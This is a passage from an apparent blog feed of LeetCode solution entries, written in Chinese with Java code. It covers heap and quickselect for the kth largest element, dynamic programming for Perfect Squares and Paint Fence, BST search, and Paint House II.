<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> PriorityQueue&lt;Integer&gt; hp;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> k;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">KthLargest</span><span class="params">(<span class="keyword">int</span> k, <span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.k = k;</span><br><span class="line">    hp = <span class="keyword">new</span> PriorityQueue&lt;&gt;();  <span class="comment">// 最小二叉堆</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">        hp.offer(num);  <span class="comment">// 加入元素</span></span><br><span class="line">        <span class="keyword">if</span> (hp.size() &gt; k) hp.poll();  <span class="comment">// 删除最小值</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">    hp.offer(val);</span><br><span class="line">    <span class="keyword">if</span> (hp.size() &gt; k) hp.poll();</span><br><span class="line">    <span class="keyword">return</span> hp.peek();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其次改进排序的方法：快速选择(quick select)算法，线性时间复杂度！</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findKthLargest</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    k = nums.length - k;</span><br><span class="line">    <span class="keyword">int</span> lo = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> hi = nums.length - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (lo &lt; hi) &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">int</span> j = partition(nums, lo, hi);</span><br><span class="line">        <span class="keyword">if</span> (j &lt; k) &#123;</span><br><span class="line">            lo = j + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j &gt; k) &#123;</span><br><span class="line">            hi = j - <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nums[k];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">partition</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> lo, <span class="keyword">int</span> hi)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i = lo;</span><br><span class="line">    <span class="keyword">int</span> j = hi + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">        <span class="keyword">while</span>(i &lt; hi &amp;&amp; less(a[++i], a[lo]));</span><br><span class="line">        <span class="keyword">while</span>(j &gt; lo &amp;&amp; less(a[lo], a[--j]));</span><br><span class="line">        <span class="keyword">if</span>(i &gt;= j) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        exch(a, i, j);</span><br><span class="line">    &#125;</span><br><span class="line">    exch(a, lo, j);</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exch</span><span class="params">(<span class="keyword">int</span>[] a, <span class="keyword">int</span> i, <span class="keyword">int</span> j)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> tmp = a[i];</span><br><span class="line">    a[i] = a[j];</span><br><span class="line">    a[j] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">less</span><span class="params">(<span class="keyword">int</span> v, <span class="keyword">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> v &lt; w;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[287. Find the Duplicate Number]]></title>
      <url>/wiki/2017/10/30/Leetcode-287-Find-the-Duplicate-Number/</url>
      <content type="html"><![CDATA[<p>Given an array <code>nums</code> containing $n + 1$ integers where each integer is between 1 and $n$ (inclusive), prove that at least one duplicate number must exist. Assume that there is only one duplicate number, find the duplicate one.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [1,3,4,2,2]</span><br><span class="line">Output: 2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [3,1,3,4,2]</span><br><span class="line">Output: 3</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ul>
<li>You must not modify the array (assume the array is read only).</li>
<li>You must use only constant, O(1) extra space.</li>
<li>Your runtime complexity should be less than $O(n^2)$.</li>
<li>There is only one duplicate number in the array, but it could be repeated more than once.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Two Pointers </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[279. Perfect Squares]]></title>
      <url>/wiki/2017/10/30/Leetcode-279-Perfect-Squares/</url>
      <content type="html"><![CDATA[<p>Given a positive integer $n$, find the least number of perfect square numbers (for example, 1, 4, 9, 16, …) which sum to $n$.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 12</span><br><span class="line">Output: 3 </span><br><span class="line">Explanation: 12 = 4 + 4 + 4.</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 13</span><br><span class="line">Output: 2</span><br><span class="line">Explanation: 13 = 4 + 9.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>考查基本的动态规划。这道题目解法有很多种，但是最直接、最快的方法是动态规划。当我们寻找和为12的平方数时，假如找到了3的平方等于9， 那么再找一下和为12-9=3的平方数，然后发现是三个1，也就是说一共有4个。顺着这个思路，</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dp[1] = dp[0] + dp[1] = 1</span><br><span class="line">dp[2] = dp[1] + dp[1] = 2</span><br><span class="line">dp[3] = dp[2] + dp[1] = 3</span><br><span class="line">dp[4] = Min&#123; dp[4-1*1]+dp[1], dp[4-2*2]+dp[4] &#125; </span><br><span class="line">      = Min&#123; dp[3]+1, dp[0]+dp[4] &#125; </span><br><span class="line">      = 1				</span><br><span class="line">dp[5] = Min&#123; dp[5-1*1]+dp[1], dp[5-2*2]+dp[4] &#125; </span><br><span class="line">      = Min&#123; dp[4]+1, dp[1]+1 &#125; </span><br><span class="line">      = 2</span><br></pre></td></tr></table></figure>
<p>OK，还有一个特殊情况要处理一下，例如<code>dp[4] = d[0] + dp[4]</code>，把dp[0]定义为1，那么所有的平方数都为1，符合题目要求。下面给出完整代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> [] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    dp[<span class="number">0</span>] = <span class="number">1</span>; dp[<span class="number">1</span>]  = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i, s = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; s &lt;= i; j++, s = j * j)</span><br><span class="line">            min = Math.min(min, dp[s] + dp[i-s]);</span><br><span class="line">        dp[i] = min;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>内循环的时间复杂度是$O(\log n)$,外循环的时间复杂度是$O(n)$，所以时间复杂度是$O(n\log n)$。但是实际上<code>dp[s=j*j]</code>肯定等于1，因为s是一个平方数，所以可以简化为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> [] dp = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i, s = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j *j &lt;= i; j++, s = j * j)</span><br><span class="line">            min = Math.min(min, <span class="number">1</span> + dp[i-s]);</span><br><span class="line">        dp[i] = min;</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>一种巧妙的方法是把<code>dp</code>设置为静态变量，在多次调用时，将计算过的值立即返回。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;Integer&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;(Collections.singletonList(<span class="number">0</span>));</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numSquares</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; list.size()) <span class="keyword">return</span> list.get(n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = list.size(); i &lt;= n; i++) &#123;</span><br><span class="line">        <span class="keyword">int</span> min = i, s = <span class="number">1</span>;</span><br><span class="line">        list.add(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; s &lt;= i; j++, s = j * j)</span><br><span class="line">            min = Math.min(min, <span class="number">1</span> + list.get(i-s));</span><br><span class="line">        list.set(i, min);</span><br><span class="line">     &#125;</span><br><span class="line">    <span class="keyword">return</span> list.get(n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Breath-first Search </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[278. First Bad Version]]></title>
      <url>/wiki/2017/10/30/Leetcode-278-First-Bad-Version/</url>
      <content type="html"><![CDATA[<p>You are a product manager and currently leading a team to develop a new product. Unfortunately, the latest version of your product fails the quality check. Since each version is developed based on the previous version, all the versions after a bad version are also bad.</p>
<p>Suppose you have $n$ versions $[1, 2, …, n]$ and you want to find out the first bad one, which causes all the following ones to be bad.</p>
<p>You are given an API bool <code>isBadVersion(version)</code> which will return whether <code>version</code> is bad. Implement a function to find the first bad version. You should minimize the number of calls to the API.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Given n = 5, and version = 4 is the first bad version.</span><br><span class="line"></span><br><span class="line">call isBadVersion(3) -&gt; false</span><br><span class="line">call isBadVersion(5) -&gt; true</span><br><span class="line">call isBadVersion(4) -&gt; true</span><br><span class="line"></span><br><span class="line">Then 4 is the first bad version.</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[276. Paint Fence]]></title>
      <url>/wiki/2017/10/30/Leetcode-276-Paint-Fence/</url>
      <content type="html"><![CDATA[<p>There is a fence with $n$ posts, each post can be painted with one of the $k$ colors.<br>You have to paint all the posts such that no more than two adjacent fence posts have the same color.<br>Return the total number of ways you can paint the fence.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Given n=3, k=2 return 6</span><br><span class="line"></span><br><span class="line">      post 1,   post 2, post 3</span><br><span class="line">way1    0         0       1 </span><br><span class="line">way2    0         1       0</span><br><span class="line">way3    0         1       1</span><br><span class="line">way4    1         0       0</span><br><span class="line">way5    1         0       1</span><br><span class="line">way6    1         1       0</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>假设<code>paint[i]</code>为有$i$个篱笆时的染色方案。可以分为两种情况：</p>
<ul>
<li>最后两个篱笆颜色相同: 前$i-2$个篱笆有<code>paint[i-2]</code>种方案，第$i-1$个和第$i$个篱笆取相同的颜色，但是要和$i-2$个篱笆不同(题目要求不能连续超过2个篱笆颜色相同)，共有$k-1$种染色法。</li>
<li>最后两个篱笆颜色不同: 前$i-1$个篱笆有<code>paint[i-1]</code>种方案，第$i$个篱笆的颜色要和第$i-1$个篱笆颜色不同，还有$k-1$种方案。</li>
</ul>
<p>由此，状态转移方程为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paint[i] = paint[i - 1] * (k - 1) + paint[i - 2] * (k - 1);</span><br></pre></td></tr></table></figure>
<p>对应的Java代码为</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> n: non-negative integer, n posts</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> k: non-negative integer, k colors</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>: an integer, the total number of ways</span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">numWays</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">1</span>) <span class="keyword">return</span> k;</span><br><span class="line">    <span class="keyword">int</span>[] paint = <span class="keyword">new</span> <span class="keyword">int</span>[n];</span><br><span class="line">    paint[<span class="number">0</span>] = k; paint[<span class="number">1</span>] = k*k;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; paint.length; i++)</span><br><span class="line">        paint[i] = (k - <span class="number">1</span>) * (paint[i - <span class="number">1</span>] + paint[i - <span class="number">2</span>]);</span><br><span class="line">    <span class="keyword">return</span> paint[n - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[270. Closest Binary Search Tree Value]]></title>
      <url>/wiki/2017/10/30/Leetcode-270-Closest-Binary-Search-Tree-Value/</url>
      <content type="html"><![CDATA[<p>Given a non-empty binary search tree and a target value, find the value in the BST that is closest to the target.</p>
<p>Note:</p>
<ul>
<li>Given target value is a floating point.</li>
<li>You are guaranteed to have only one unique value in the BST that is closest to the target.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>二叉搜索树的二分查找。既然是二叉搜索树，不是一般的二叉树，就要充分利用二叉搜索树的性质。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">closestValue</span><span class="params">(TreeNode root, <span class="keyword">double</span> target)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> val = root.val;</span><br><span class="line">    <span class="keyword">while</span> (root != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">// 找到该值</span></span><br><span class="line">        <span class="keyword">if</span> (root.val == target) <span class="keyword">return</span> root.val;</span><br><span class="line">        <span class="comment">// 现在的值比以前的更加接近target</span></span><br><span class="line">        <span class="keyword">if</span> (Math.abs(root.val - target) &lt; Math.abs(val - target))</span><br><span class="line">            val = root.val;</span><br><span class="line">        <span class="comment">// 往左子树或者右子树查找</span></span><br><span class="line">        <span class="keyword">if</span> (root.val &lt; target) root = root.right;</span><br><span class="line">        <span class="keyword">else</span> root = root.left;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Binary Search Tree </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[687. Longest Univalue Path]]></title>
      <url>/wiki/2017/10/30/Leetcode-687-Longest-Univalue-Path/</url>
      <content type="html"><![CDATA[<p>Given a binary tree, find the length of the longest path where each node in the path has the same value. This path may or may not pass through the root.</p>
<p>Note: The length of path between two nodes is represented by the number of edges between them.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">              5</span><br><span class="line">             / \</span><br><span class="line">            4   5</span><br><span class="line">           / \   \</span><br><span class="line">          1   1   5</span><br><span class="line">Output:</span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input:</span><br><span class="line"></span><br><span class="line">              1</span><br><span class="line">             / \</span><br><span class="line">            4   5</span><br><span class="line">           / \   \</span><br><span class="line">          4   4   5</span><br><span class="line">Output:</span><br><span class="line"></span><br><span class="line">2</span><br></pre></td></tr></table></figure>
<p>Note: The given binary tree has not more than 10000 nodes. The height of the tree is not more than 1000.</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目和LeetCode 124. Binary Tree Maximum Path Sum整体思路是一样的。Q124求的是最大路径和，这道题目求的是最长路径。<code>longestUnivaluePathHelper(root)</code>返回的是从底往上到达root节点的最长路径。<code>maxValue</code>变量保存着最长路径。如果root节点的左子节点和右子节点和root节点的值相同，<code>maxValue</code>要增加，增加的长度和root节点与哪一部分节点相同有关。如果root节点和左右子节点的值都不同，则<code>longestUnivaluePathHelper(root)</code>返回0。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">int</span> maxValue;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestUnivaluePath</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    maxValue = <span class="number">0</span>;</span><br><span class="line">    longestUnivaluePathHelper(root);</span><br><span class="line">    <span class="keyword">return</span> maxValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">longestUnivaluePathHelper</span><span class="params">(TreeNode root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (root == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> left = longestUnivaluePathHelper(root.left);</span><br><span class="line">    <span class="keyword">int</span> right = longestUnivaluePathHelper(root.right);</span><br><span class="line">    <span class="keyword">if</span> (root.left != <span class="keyword">null</span> &amp;&amp; root.val == root.left.val) left++;</span><br><span class="line">    <span class="keyword">else</span> left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (root.right != <span class="keyword">null</span> &amp;&amp; root.val == root.right.val) right++;</span><br><span class="line">    <span class="keyword">else</span> right = <span class="number">0</span>;</span><br><span class="line">    maxValue = Math.max(maxValue, left + right);</span><br><span class="line">    <span class="keyword">return</span> Math.max(left, right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[265. Paint House II]]></title>
      <url>/wiki/2017/10/30/Leetcode-265-Paint-House-II/</url>
      <content type="html"><![CDATA[<p>There are a row of <code>n</code> houses, each house can be painted with one of the <code>k</code> colors. The cost of painting each house with a certain color is different. You have to paint all the houses such that no two adjacent houses have the same color.</p>
<p>The cost of painting each house with a certain color is represented by a <code>n x k</code> cost matrix. For example, <code>costs[0][0]</code> is the cost of painting house 0 with color 0; <code>costs[1][2]</code> is the cost of painting house 1 with color 2, and so on… Find the minimum cost to paint all houses.</p>
<p>All costs are positive integers.</p>
<p><strong>Example</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Given n = 3, k = 3, costs = [[14,2,11],[11,14,5],[14,3,10]] </span><br><span class="line">return 10. </span><br><span class="line">Explanation: house 0 is color 2, house 1 is color 3, house 2 is color 2, 2 + 5 + 3 = 10</span><br></pre></td></tr></table></figure>
<p><strong>ChallengeCould</strong>: you solve it in $O(nk)$?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目LeetCode要收费的，相应的<a href="https://www.lintcode.com/problem/paint-house-ii/description">LintCode链接</a>。与LeetCode 256. Paint House一摸一样，把3变成$k$而已。代码思路一摸一样。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">minCostII</span><span class="params">(<span class="keyword">int</span>[][] costs)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (costs == <span class="keyword">null</span> || costs.length == <span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span>[][] dp = costs.clone();</span><br><span class="line">    <span class="keyword">int</span> k = dp[<span class="number">0</span>].length;</span><br><span class="line">    <span class="keyword">int</span> prevMin = Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; dp.length; i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">            <span class="comment">// 求刷到前一栋房子的最小费用为prevMin</span></span><br><span class="line">            <span class="comment">// 注意每个j对应的prevMin都不一样</span></span><br><span class="line">            prevMin = Integer.MAX_VALUE;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> kk = <span class="number">1</span>; kk &lt; k; kk++)</span><br><span class="line">                <span class="keyword">if</span> (dp[i - <span class="number">1</span>][(j + kk) % k] &lt; prevMin)</span><br><span class="line">                    prevMin = dp[i - <span class="number">1</span>][(j + kk) % k];</span><br><span class="line">            <span class="comment">// 刷到第i栋房子，用j颜色的费用 = </span></span><br><span class="line">            <span class="comment">// 求刷到前一栋房子i-1的最小费用 + 刷这一栋房子i的费用</span></span><br><span class="line">            dp[i][j] += prevMin;</span><br><span class="line">        &#125;</span><br><span 